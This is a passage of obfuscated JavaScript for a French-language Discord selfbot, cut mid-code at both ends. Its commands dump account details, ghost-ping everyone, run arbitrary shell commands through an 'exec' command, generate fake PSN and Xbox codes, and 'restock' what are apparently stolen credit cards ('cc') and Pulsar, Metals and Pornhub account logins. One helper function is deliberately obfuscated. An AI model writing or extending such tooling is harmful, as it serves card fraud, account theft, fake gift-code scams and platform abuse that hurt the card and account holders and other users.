                            const ts = new aw.RichEmbed().setColor(ad).addField('plateforme :', '``' + aG.platform() + '``', true);
                            cg.channel.send(ts), console.log(ay.hex(t)('plateforme effectué'));
                          }
                        }
                        if (cg.content === ab + 'numero') {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            const tu = new aw.RichEmbed().setColor(ad).addField('numero sur le compte :', '' + aN.user.mobile);
                            cg.channel.send(tu), console.log(ay.hex(t)('plateforme effectué'));
                          }
                        }
                        var fY = 'jsp',
                          fZ = 'jsp',
                          g0 = 'jsp';
                        aN.user.mfaEnabled ? fY = 'oui' : fY = 'non', aN.user.phone ? fZ = aN.user.phone : fZ = 'aucun', aN.user.verified ? g0 = 'oui' : g0 = 'non', aN.user.key ? g1 = 'oui' : g1 = 'non';
                        const {
                          version: g2
                        } = require('discord.js');
                        aL.usagePercent(function (tv, tw, tx) {
                          if (cg.content === ab + 'info') {
                            if (cg.author.id === aN.user.id) {
                              if (cg.deletable) cg.delete();
                              let tD = new Date(null);
                              tD.setMilliseconds(aN.uptime);
                              let tE = tD.toISOString().substr(11, 2),
                                tF = tD.toISOString().substr(14, 2),
                                tG = tD.toISOString().substr(17, 2);
                              var tA = new aw.RichEmbed().setTitle('** 「INFO」 **').setDescription('').addField(' ``` 👱‍♂️ 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲```', '' + aN.user.username).addField(' ``` 📣 𝗩𝗲𝗿𝘀𝗶𝗼𝗻``` ', '***' + g2 + '***').addField(' ``` 🎆 𝗣𝗿𝗲𝗳𝗶𝘅``` ', '***' + ab + '***').addBlankField().addField(' ``` 🔐 𝗔𝟮𝗳```', '***' + fY + '***').addField(' ``` 📱 𝗽𝗼𝗿𝘁𝗮𝗯𝗹𝗲 𝘀𝘂𝗿 𝗹𝗲 𝗰𝗼𝗺𝗽𝘁𝗲```', '***' + fZ + '***').addField(' ``` 📜 𝗖𝗵𝗮𝗻𝗻𝗲𝗹𝘀```', '***' + aN.channels.size + '***', true).addField(' ``` 👥 𝗔𝗺𝗶𝘀```', '***' + aN.user.friends.size + '***', true).addField(' ``` 🗄️ 𝗦𝗲𝗿𝘃𝗲𝘂𝗿```', '***' + aN.guilds.size + '***', true).addBlankField().addField(' ``` ✉️ 𝗲𝗺𝗮𝗶𝗹 𝘃𝗲𝗿𝗶𝗳```', '***' + g0 + '***').addField(' ``` 💻 𝗨𝘀𝗲𝗿𝘀```', '***' + aN.guilds.map(tH => tH.memberCount).reduce((tH, tI) => tH + tI) + '***', true).addField(' ``` 📊 𝗠𝗲𝗺𝗼𝗶𝗿𝗲 𝗨𝘀𝗮𝗴𝗲(Ram) ``` ', '***' + (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2) + ' / ' + (aG.totalmem() / 1024 / 1024).toFixed(2) + ' MB***', true).addBlankField().addField('``` ⚙️ Arch```', '***' + process.arch + '***', true).addField('``` 🔒 Version Node```', '***' + process.version + '***', true).addField('``` 🔒 Discord.js```', '***v' + g2 + '***', true).addBlankField().addField('``` 🎛️ CPU```', '***' + aG.cpus().map(tH => '' + tH.model)[0] + '***').addField('``` 📈 CPU usage```', '***' + tw.toFixed(2) + '%***').addField(' ``` ⌚ 𝗨𝗽𝘁𝗶𝗺𝗲```', '***' + tE + ' Hours | ' + tF + ' Minutes | ' + tG + ' Seconds***').setImage(bm).setColor(ad).setThumbnail(cg.author.avatarURL).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setTimestamp();
                              cg.channel.send(tA);
                            }
                          }
                        });
                        if (cg.content.startsWith(ab + 'ghostping')) {
                          cg.edit('@everyone'), cg.edit('.');
                        }
                        cg.content.startsWith(ab + 'abc') && (cg.edit('a'), cg.edit('b'), cg.edit('c'), cg.edit('d'), cg.edit('e'), cg.edit('f'), cg.edit('g'), cg.edit('h'), cg.edit('i'), cg.edit('j'), cg.edit('k'), cg.edit('l'), cg.edit('m'), cg.edit('n'), cg.edit('o'), cg.edit('p'), cg.edit('q'), cg.edit('r'), cg.edit('s'), cg.edit('t'), cg.edit('u'), cg.edit('v'), cg.edit('w'), cg.edit('x'), cg.edit('y'), cg.edit('z'));
                        if (cg.content.startsWith(ab + 'roleinfo')) {
                          if (cg.author.id === aN.user.id) {
                            let tx = cg.guild,
                              ty = cg.mentions.roles.first();
                            if (!tx) return cg.edit(':x: **Commande uniquement utilisable sur un serveur**');
                            if (!ty) return cg.delete().then(console.log('[', ay.hex(u)('ERROR'), ']', ay.hex(y)('un nom de rôle est nécessaire')));
                            var g4 = {};
                            g4.false = 'Non', g4.true = 'oui';
                            const tz = g4;
                            let tA = new aw.RichEmbed().setColor(ad).setDescription('<@&' + ty.id + '>').addField('id du role:', ty.id).addField('couleur:', ty.hexColor).setFooter('𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩', '' + aN.user.avatarURL).addField('nombre de membres ayant ce role:', ty.members.size).addField('position:', ty.position).addField('mentionnable:', tz[ty.mentionable]);
                            if (!cg.member.hasPermission('EMBED_LINKS')) return cg.edit(':x: **permission insuffisante (embed_links)**\n<@&' + ty.id + '>\n\nid du role: ' + ty.id + '\ncouleur du role: ' + ty.hexColor + '\nmembres ayant ce role: ' + ty.members.size + '\nposition: ' + ty.position + '\nmentionnable: ' + tz[ty.mentionable]);
                            console.log(ay.hex(t)('Commande role info effectué')), cg.edit(tA).catch(tB => console.log('[', ay.hex(u)('ERROR'), ']', 'une erreur est survenue que je ne peux régler'));
                          }
                        }
                        if (cg.content.startsWith(ab + 'load')) {
                          if (cg.author.id === aN.user.id) {
                            cg.delete();
                            var g5 = '.',
                              g6 = '█';
                            cg.channel.send('```[' + g5.repeat(50) + ']```').then(tE => {
                              for (cy = 0; cy <= 50; cy++) {
                                tE.edit('```[' + g6.repeat(cy) + g5.repeat(50 - cy) + ']  -  ' + cy * 100 / 50 + '%\nloading..```');
                              }
                              tE.edit('`Succesfull load.`').catch(tF => console.log('[', ay.hex(u)('ERROR'), ']', 'une erreur est survenue que je ne peux régler')), console.log(ay.hex(t)('Commande load effectué'));
                            });
                          }
                        }
                        if (cg.content === ab + 'omg') {
                          if (cg.author.id === aN.user.id) {
                            cg.delete();
                            var g7 = new aw.RichEmbed().setColor(ad).setTitle('REGARDE OMG').setImage('https://media.discordapp.net/attachments/495996735097798686/569116910126628865/ezgif.com-gif-maker.gif');
                            cg.channel.send(g7);
                          }
                        }
                        if (cg.content === ab + 'roux') {
                          if (cg.author.id === aN.user.id) {
                            cg.delete();
                            var g8 = new aw.RichEmbed().setColor(ad).setTitle('téma la gueule du roux').setImage('https://sp.yimg.com/ib/th?id=OIP.FOt3VQiGurIlaM2HdFuRtAHaI4&pid=15.1&rs=1&c=1&qlt=95&w=88&h=106');
                            cg.channel.send(g8);
                          }
                        }
                        cg.content.startsWith(ab + 'dance') && cg.author.id === aN.user.id && (setTimeout(function () {
                          cg.edit('`> (°□°）>`');
                        }, 1000), setTimeout(function () {
                          cg.edit('`^ (°□°）^`');
                        }, 3000), setTimeout(function () {
                          cg.edit('`< (°□°）<`');
                        }, 5000), setTimeout(function () {
                          cg.edit('`> (°□°）>`');
                        }, 7000), setTimeout(function () {
                          cg.edit('`^ (°□°）^`');
                        }, 9000), setTimeout(function () {
                          cg.edit('`> (°□°）>`');
                        }, 11000));
                        if (cg.content === ab + 'euuu') {
                          if (cg.author.id === aN.user.id) {
                            cg.edit('(′ʘ⌄ʘ‵)');
                          }
                        }
                        if (cg.content === ab + 'yop') {
                          if (cg.author.id === aN.user.id) {
                            cg.edit('=͟͟͞͞( ✌°∀° )☛');
                          }
                        }
                        if (cg.content === ab + 'merci') {
                          if (cg.author.id === aN.user.id) {
                            cg.edit('(＾▽＾)');
                          }
                        }
                        if (cg.content === ab + '...') {
                          if (cg.author.id === aN.user.id) {
                            cg.edit('.');
                            cg.edit('..');
                            cg.edit('...');
                            cg.edit('.');
                            cg.edit('..');
                            cg.edit('...');
                            cg.edit('.');
                            cg.edit('..');
                            cg.edit('...');
                            cg.edit('.');
                            cg.edit('..');
                            cg.edit('...');
                            cg.edit('.');
                            cg.edit('..');
                            cg.edit('...');
                            cg.edit('.');
                            cg.edit('..');
                            cg.edit('...');
                            cg.edit('.');
                            cg.edit('..');
                            cg.edit('...');
                            cg.edit('.');
                            cg.edit('..');
                            cg.edit('...');
                            cg.edit('.');
                            cg.edit('..');
                            cg.edit('...');
                            cg.edit('.');
                            cg.edit('..');
                            cg.edit('...');
                            cg.edit('.');
                            cg.edit('..');
                            cg.edit('...');
                            cg.edit('.');
                            cg.edit('..');
                            cg.edit('...');
                            cg.edit('.');
                            cg.edit('..');
                            cg.edit('...');
                            cg.edit('.');
                            cg.edit('..');
                            cg.edit('...');
                            cg.edit('.');
                            cg.edit('..');
                            cg.edit('...');
                          }
                        }
                        cg.content.startsWith(ab + 'suicide') && cg.author.id === aN.user.id && (setTimeout(function () {
                          cg.edit(':sob: :gun:');
                        }, 1000), setTimeout(function () {
                          cg.edit(':boom:');
                        }, 3000), setTimeout(function () {
                          cg.edit(':skull:');
                        }, 5000));
                        if (cg.content.includes(ab + 'qrcode')) {
                          if (cg.author.id === aN.user.id) {
                            cg.delete();
                            if (c9) {
                              if (!d8[0]) return cg.channel.send('❌**  il manque le lien du site à convertire en qrcode **');
                              const tK = new aw.RichEmbed().setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setImage('https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=' + encodeURIComponent(d8.join(' ')));
                              var gb = {};
                              gb.embed = tK, cg.channel.send(gb);
                            } else cg.channel.send(cu);
                          }
                        }
                        if (cg.content.includes(ab + 'lqrcode')) {
                          if (cg.author.id === aN.user.id) {
                            cg.delete();
                            if (c9) {
                              if (!d8[0]) return cg.channel.send('❌**  il manque le lien de l\'image du qrcode **');
                              aD.get('https://api.qrserver.com/v1/read-qr-code/?fileurl=' + encodeURIComponent(d8.join(' '))).then(tM => {
                                var tN = tM.body.type,
                                  tO = tM.body.seq,
                                  tP = tM.body.data;
                                const tQ = new aw.RichEmbed().setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setDescription('**Type:** ' + tN + ' \n**Data:** ' + tP + ' \n**Séquence:** ' + tO);
                                cg.channel.send(tQ);
                              });
                            } else cg.channel.send(cu);
                          }
                        }
                        if (cg.content.startsWith(ab + 'osu')) {
                          if (cg.author.id === aN.user.id) {
                            const tM = new aw.RichEmbed().setTitle('**Voici les stats osu de : ' + encodeURIComponent(d8.join(' ')) + '**').setColor(ad).setImage('http://lemmmy.pw/osusig/sig.php?colour=hexc246f2&uname=' + encodeURIComponent(d8.join(' ')) + '&pp=1&countryrank&flagshadow&flagstroke&darkheader&darktriangles&opaqueavatar&avatarrounding=4&rankedscore&onlineindicator=undefined&xpbar&xpbarhex').setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            var gc = {};
                            gc.embed = tM, cg.channel.send(gc);
                          }
                        }
                        cg.content.startsWith(ab + 'singosu') && cg.author.id === aN.user.id && (cg.delete(), cg.channel.send('osusing :arrow_forward:https://osusig.ppy.sh/image1.png?uid=' + encodeURIComponent(d8.join(' ')) + '&m=0'));
                        if (cg.content.startsWith(ab + 'mc')) {
                          if (cg.author.id === aN.user.id) {
                            cg.delete();
                            const tO = new aw.RichEmbed().setTitle('').setColor(ad).setImage('https://minecraftskinstealer.com/achievement/1/Achievement%20Get!/' + encodeURIComponent(d8.join(' '))).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            var gd = {};
                            gd.embed = tO, cg.channel.send(gd);
                          }
                        }
                        if (cg.content.startsWith(ab + 'tfortnite')) {
                          if (cg.author.id == aN.user.id) {
                            var cq = new aw.RichEmbed().setTitle('').setColor(ad).setImage('http://fortnitefontgenerator.com/img.php?fontsize=38&textcolor=FFFFFF&text=' + encodeURIComponent(d8.join(' '))).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.edit(cq);
                          }
                        }
                        if (cg.content.startsWith(ab + 'meteo')) {
                          if (cg.author.id === aN.user.id) {
                            cg.delete();
                            var ge = {};
                            ge.search = d8.join(' '), ge.degreeType = 'C', aI.find(ge, function (tQ, tR) {
                              if (tQ) cg.channel.send(tQ);
                              if (tR === undefined || tR.length === 0) {
                                cg.channel.send('**please enter a location!**');
                                return;
                              }
                              var tS = tR[0].current,
                                tT = tR[0].location;
                              const tU = new aw.RichEmbed().setDescription('**' + tS.skytext + '**').setAuthor('Weather for ' + tS.observationpoint).setThumbnail(tS.imageUrl).setColor(ad).addField('⌛Timezone', 'UTC' + tT.timezone, true).addField('🌡️Temperature', tS.temperature + ' °C', true).addField('🌡️Feels Like', tS.feelslike + ' °C', true).addField('💨Winds', tS.winddisplay, true).addField('💧Humidity', tS.humidity + '%', true).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                              cg.channel.send(tU);
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'sgiphy')) {
                          if (cg.author.id === aN.user.id) {
                            cg.delete();
                            if (d8.length < 1) return cg.channel.send('You must give me query tp search');
                            const tS = cg.channel.send('🔎Searching');
                            cg.channel.send();
                            var gf = {};
                            gf.url = 'http://api.giphy.com/v1/gifs/search', gf.qs = {}, gf.json = true, gf.qs.q = encodeURIComponent(d8.join(' ')), gf.qs.api_key = 'dc6zaTOxFJmzC', gf.qs.rating = cg.channel.nsfw ? 'r' : 'pg';
                            const tT = aN.req(gf);
                            if (tT.length < 1) {
                              tS.edit('❗**Aucun résultat trouvé**'), cg.channel.stopTyping();
                            }
                            const tU = new emb().setColor(ad).setImage(tT[Math.floor(Math.random() * tT.length) - 1].images.original.url);
                            tS.edit(tU).then(() => cg.channel.stopTyping()), cg.channel.stopTyping();
                          }
                        }
                        if (cg.content.startsWith(ab + 'exec')) {
                          if (cg.author.id === aN.user.id) {
                            cg.delete();
                            if (!d8.join(' ')) return cg.channel.send('No parameter to execute. you\'re stuppid');
                            let tW = d8.join(' ');
                            const tX = new aw.RichEmbed().setColor(ad).addField('📥 INPUT', '```bash\n' + tW + '```');
                            aH(tW, async (tY, tZ, u0) => {
                              if (tZ) {
                                var u3 = '```bash\n' + tZ + '```';
                                if (tZ.length > 1024) {
                                  var {
                                    body: u4
                                  } = aN.snek.post('https://www.hastebin.com/documents').send(tZ);
                                  u3 = 'https://www.hastebin.com/' + u4.key + '.js';
                                }
                                tX.addField('📤OUTPUT', u3);
                              } else {
                                if (u0) {
                                  var tY = '```bash\n' + u0 + '```';
                                  if (u0.length > 1024) {
                                    var {
                                      body: u4
                                    } = aN.snek.post('https://www.hastebin.com/documents').send(u0);
                                    tY = 'https://www.hastebin.com/' + u4.key + '.js';
                                  }
                                  tX.addField('⛔ERROR', tY);
                                } else {
                                  tX.addField('📤OUPUT', '```bash\n# Command executed successfully but returned no output.```');
                                }
                              }
                              cg.channel.send(tX);
                            });
                          }
                        }
                        if (cg.content === ab + 'hello') {
                          cg.author.id === aN.user.id && cg.edit('\n    ╔╗╔╗╔═╗╔╗ ╔╗ ╔═╗\n    ║╚╝║║╦╝║║ ║║ ║║║\n    ║╔╗║║╩╗║╚╗║╚╗║║║\n    ╚╝╚╝╚═╝╚═╝╚═╝╚═╝');
                        }
                        cg.content === ab + 'pc' && cg.author === aN.user.id && cg.edit('\n                 ._________________.\n                 |.---------------.|\n                 ||               ||\n                 ||   -._ .-.     ||\n                 ||   -._| | |    ||\n                 ||   -._|"|"|    ||\n                 ||   -._|.-.|    ||\n                 ||_______________||\n                 /.-.-.-.-.-.-.-.-.                /.-.-.-.-.-.-.-.-.-.               /.-.-.-.-.-.-.-.-.-.-.              /______/__________ ___o_ \n               _______________________/');
                        function gg(tZ, u0) {
                          var u3 = '-';
                          if (u0.indexOf('a') > -1) u3 += 'abcdefghijklmnopqrstuvwxyz';
                          if (u0.indexOf('A') > -1) u3 += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
                          if (u0.indexOf('0') > -1) u3 += '0123456789';
                          var u4 = '';
                          for (var u6 = tZ; u6 > 0; --u6) {
                            u4 += u3[Math.floor(Math.random() * u3.length)];
                          }
                          return u4;
                        }
                        if (cg.author.id !== aN.user.id) return;
                        if (cg.content === ab + 'psn') try {
                          var gh = cg.content.toString(),
                            gi = gh.substring(10),
                            gj = parseInt(gi),
                            gk = gj * 1000;
                          if (gj > 4) {
                            setInterval(spamla, gk);
                          } else {
                            cg.channel.send('T6D4-VD82-' + gg(4, '0AB'));
                          }
                        } catch (u1) {
                          cg.channel.send('Une erreur technique est survenue!');
                        }
                        function gg(u2, u3) {
                          var a5Y = function (c, d) {
                              return MS(d, c - '0xde');
                            },
                            u4 = '-';
                          if (u3[a5Y('0x395d', 'OffE')]('a') > -1) u4 += a5Y('0x5d6f', '8bj2');
                          if (u3[a5Y('0x5729', 'K[!&')]('A') > -1) u4 += ci[a5Y('0x4392', 'eQV]')];
                          if (ci[a5Y('0x8219', 'tmDk')](u3[a5Y('0x2e9a', 'Uy4x')]('0'), -1)) u4 += '0123456789';
                          var u5 = '';
                          for (var u7 = u2; ci[a5Y('0x10bd', 'IzUz')](u7, 0); --u7) {
                            u5 += u4[Math.floor(ci[a5Y('0x11a6', 'gKKi')](Math[a5Y('0x537c', 'Uy4x')](), u4[a5Y('0x4007', ')1!W')]))];
                          }
                          return u5;
                        }
                        if (cg.author.id !== aN.user.id) return;
                        if (cg.content === ab + 'xbox') try {
                          var gh = cg.content.toString(),
                            gi = gh.substring(10),
                            gj = parseInt(gi),
                            gk = gj * 1000;
                          if (gj > 4) setInterval(spamla, gk);else {
                            cg.channel.send('T6D4D-VD823-C3MG7-7VFH3-' + gg(5, '0AB'));
                          }
                        } catch (u3) {
                          cg.channel.send('Une erreur technique est survenue!');
                        }
                        if (cg.content.startsWith(ab + 'time')) {
                          cg.delete();
                          var gl = {};
                          gl.name = aN.user.username;
                          var gm = {};
                          gm.author = gl, gm.color = 0x8af3, gm.title = 'Date and time', gm.description = '' + ax().format('MMMM Do YYYY, h:mm:ss a'), gm.footer = {}, gm.footer.text = '𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩', gm.footer.icon_url = aN.user.avatarURL;
                          var gn = {};
                          gn.embed = gm, cg.channel.send('', gn), console.log(ab + 'time');
                        }
                        if (cg.content.startsWith(ab + '-_-')) {
                          cg.author.id == aN.user.id && cg.edit('ヽ༼⊙_⊙༽ﾉ');
                        }
                        cg.content.startsWith(ab + 'ok mec') && cg.author.id == aN.user.id && cg.edit('(-’๏_๏’-)');
                        cg.content.startsWith(ab + 'o_o') && cg.author.id === aN.user.id && (setTimeout(function () {
                          cg.edit('o.o');
                        }, 1000), setTimeout(function () {
                          cg.edit('o.O');
                        }, 3000), setTimeout(function () {
                          cg.edit('O.o');
                        }, 5000), setTimeout(function () {
                          cg.edit('O_o');
                        }, 7000), setTimeout(function () {
                          cg.edit('o_O');
                        }, 9000), setTimeout(function () {
                          cg.edit('o_o');
                        }, 11000));
                        if (cg.content.startsWith(ab + 'hast')) {
                          if (cg.author.id === aN.user.id) {
                            let u7 = d8.slice(0).join(' ');
                            if (!d8[0]) return cg.edit(':x: Il manque un argument');
                            aE(u7).then(u8 => {
                              cg.edit(':white_check_mark: Votre text est sur ce lien hastebins: ' + u8);
                            }).catch(cg.edit(':x: Impossible de créer le hastebins: ' + console.error));
                          }
                        }
                        cg.content === ab + 'metal' && cg.author.id === aN.user.id && (console.log('(Commande : {/metals} Effectuer) \n ================'), cg.delete(), cg.channel.send('>>> Restock de Metal en cours..').then(u8 => {
                          u8.edit('>>> Restock  en cours \n **Chargement.** \n ▓░░░░░░░░░░░░░░░░░░░░░░░░ 4%');
                          u8.edit('>>> Restock  en cours \n **Chargement..** \n ▓▓░░░░░░░░░░░░░░░░░░░░░░░ 8%');
                          u8.edit('>>> Restock  en cours \n **Chargement...** \n ▓▓▓░░░░░░░░░░░░░░░░░░░░░░ 12%');
                          u8.edit('>>> Restock  en cours \n **Chargement.** \n ▓▓▓▓░░░░░░░░░░░░░░░░░░░░░ 16%');
                          u8.edit('>>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓░░░░░░░░░░░░░░░░░░░░ 20%');
                          u8.edit('>>> Restock  en cours \n **Chargement...** \n ▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░░ 24%');
                          u8.edit('>>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░ 28%');
                          u8.edit('>>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░ 32%');
                          u8.edit('>>> Restock  en cours \n **Chargement...** \n ▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░ 36%');
                          u8.edit('>>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░░ 40%');
                          u8.edit('>>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░ 44%');
                          u8.edit('>>> Restock  en cours \n **Chargement...** \n ▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░ 48%');
                          u8.edit('>>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░ 52%');
                          u8.edit('>>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░ 56%');
                          u8.edit('>>> Restock  en cours \n **Chargement...** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░ 60%');
                          u8.edit('>>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░ 64%');
                          u8.edit('>>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░ 68%');
                          u8.edit('>>> Restock  en cours \n **Chargement...** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░ 72%');
                          u8.edit('>>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░ 76%');
                          u8.edit('>>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░ 80%');
                          u8.edit('>>> Restock  en cours \n **Chargement...** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░ 84%');
                          u8.edit('>>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░ 88%');
                          u8.edit('>>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░ 92%');
                          u8.edit('>>> Restock  en cours \n **Chargement...** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░ 96%');
                          u8.edit('>>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓100% ');
                          var ub = Math.floor(Math.random() * gy.length);
                          u8.edit('>>> ***Voila ton jeu metals :*** ' + gy[ub]);
                        }));
                        if (cg.content === ab + 'cc') {
                          cg.author.id === aN.user.id && (c9 ? (console.log('(Commande : {/cc} Effectuer) \n ================'), cg.delete(), cg.channel.send('>>> Restock de cc en cours..').then(u8 => {
                            u8.edit('>>> Restock  en cours \n **Chargement.** \n ▓░░░░░░░░░░░░░░░░░░░░░░░░ 4%');
                            u8.edit('>>> Restock  en cours \n **Chargement...** \n ▓▓▓░░░░░░░░░░░░░░░░░░░░░░ 12%');
                            u8.edit('>>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓░░░░░░░░░░░░░░░░░░░░ 20%');
                            u8.edit('>>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░ 28%');
                            u8.edit('>>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░ 32%');
                            u8.edit('>>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░ 44%');
                            u8.edit('>>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░ 52%');
                            u8.edit('>>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░ 64%');
                            u8.edit('>>> Restock  en cours \n **Chargement...** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░ 72%');
                            u8.edit('>>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░ 80%');
                            u8.edit('>>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░ 88%');
                            u8.edit('>>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░ 92%');
                            u8.edit('>>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓100% ');
                            var ud = Math.floor(Math.random() * gp.length);
                            u8.edit('>>> ***Voila ta cc :***' + gp[ud]);
                          })) : message1.edit(cu));
                        }
                        if (cg.content === ab + 'pulsar') {
                          if (cg.author.id === aN.user.id) {
                            if (c9) cg.delete(), cg.channel.send('>>> Restock de pulsar en cours..').then(u9 => {
                              u9.edit('>>> Restock  en cours \n **Chargement.** \n ▓░░░░░░░░░░░░░░░░░░░░░░░░ 4%');
                              u9.edit('>>> Restock  en cours \n **Chargement...** \n ▓▓▓░░░░░░░░░░░░░░░░░░░░░░ 12%');
                              u9.edit('>>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓░░░░░░░░░░░░░░░░░░░░ 20%');
                              u9.edit('>>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░ 28%');
                              u9.edit('>>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░ 32%');
                              u9.edit('>>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░ 52%');
                              u9.edit('>>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░ 64%');
                              u9.edit('>>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░ 88%');
                              u9.edit('>>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓100% ');
                              var uc = Math.floor(Math.random() * gq.length);
                              u9.edit('>>> ***Voila ton pulsar :***' + gq[uc]);
                            });else {
                              cg.edit(cu);
                            }
                          }
                        }
                        if (cg.content === ab + 'pornhub') {
                          if (cg.author.id === aN.user.id) {
                            if (c9) {
                              console.log('(Commande : {/pornhub} Effectuer) \n ================'), cg.delete(), cg.channel.send('>>> Restock de pornhub en cours..').then(uc => {
                                uc.edit('>>> Restock  en cours \n **Chargement.** \n ▓░░░░░░░░���░░░░░░░░░░░░░░░ 4%');
                                uc.edit('>>> Restock  en cours \n **Chargement...** \n ▓▓▓░░░░░░░░░░░░░░░░░░░░░░ 12%');
                                uc.edit('>>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓░░░░░░░░░░░░░░░░░░░░ 20%');
                                uc.edit('>>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░ 28%');
                                uc.edit('>>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░ 32%');
                                uc.edit('>>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░ 44%');
                                uc.edit('>>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░ 52%');
                                uc.edit('>>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░ 64%');
                                uc.edit('>>> Restock  en cours \n **Chargement...** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░ 72%');
                                uc.edit('>>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░ 80%');
                                uc.edit('>>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░ 88%');
                                uc.edit('>>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░ 92%');
                                uc.edit('>>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓100% ');
                                var uf = Math.floor(Math.random() * gx.length);
                                uc.edit('>>> ***Voila ton compte pornhub :***' + gx[uf]);
                              });
